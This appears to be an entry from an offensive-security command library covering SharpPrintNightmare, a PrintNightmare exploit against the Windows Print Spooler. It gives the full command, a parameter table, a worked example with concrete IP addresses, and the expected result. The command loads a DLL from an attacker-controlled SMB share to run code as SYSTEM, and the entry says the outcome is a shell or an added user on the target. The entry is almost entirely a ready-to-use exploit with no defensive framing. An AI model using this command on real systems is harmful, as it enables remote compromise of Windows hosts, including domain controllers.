---
id: 4cfa5249-6da8-40d4-8e39-b1b3cdc9ef41
type: command
executor: cmd
data: >-
  SharpPrintNightmare.exe '\\\\ATTACKER\\share\\payload.dll'
  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxx\\Amd64\\UNIDRV.DLL'
  '\\\\TARGET\\pipe'
output: null
created_at: '2023-04-06T03:56:02.971315+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - rce
  - printnightmare
verified: true
validated: true
---

# SharpPrintNightmare-RCE-Existing-Context

## Command

```cmd
SharpPrintNightmare.exe '\\\\ATTACKER\\share\\payload.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxx\\Amd64\\UNIDRV.DLL' '\\\\TARGET\\pipe'
```

## Description

Performs RCE by loading a remote DLL into the Print Spooler using existing authentication context, replacing UNIDRV.DLL to execute as SYSTEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '\\\\ATTACKER\\share\\payload.dll' | UNC path to DLL | Yes |
| 'C:\\Windows\\System32\\...\\UNIDRV.DLL' | Target spooler DLL path to hijack | Yes |
| '\\\\TARGET\\pipe' | Target named pipe or IP for execution | Yes |

## Examples

### Basic Usage

```cmd
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
```

## Expected Output

Success message: 'Exploit completed, DLL executed'. Incoming shell or user addition on target.

## Related

- [[Related Procedure: Exploit-PrintNightmare-for-SYSTEM-Shell-on-Domain-Controller]]
- [[Related Tool: SharpPrintNightmare]]
